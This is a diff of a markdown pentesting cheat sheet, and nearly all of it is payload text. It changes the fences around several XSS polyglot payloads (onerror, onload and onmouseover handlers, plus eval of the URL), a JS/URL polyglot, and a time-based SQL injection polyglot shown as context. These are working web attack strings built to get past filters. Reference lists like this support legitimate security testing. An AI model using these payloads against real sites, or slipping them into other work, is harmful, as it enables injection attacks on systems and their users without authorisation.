@@ -245,16 +245,16 @@ The following table uses the $ip variable which can be set with the following co
 
 ### XSS polyglot
 
-```
+```js
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 ```
-```
+```js
 '">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>
 ```
-```
+```js
 " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)// 
 ```
-```
+```js
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
 ```
 
@@ -267,7 +267,7 @@ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(
 ```
 
 ### JS/URL polyglot
-```
+```js
 data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
 ```
 
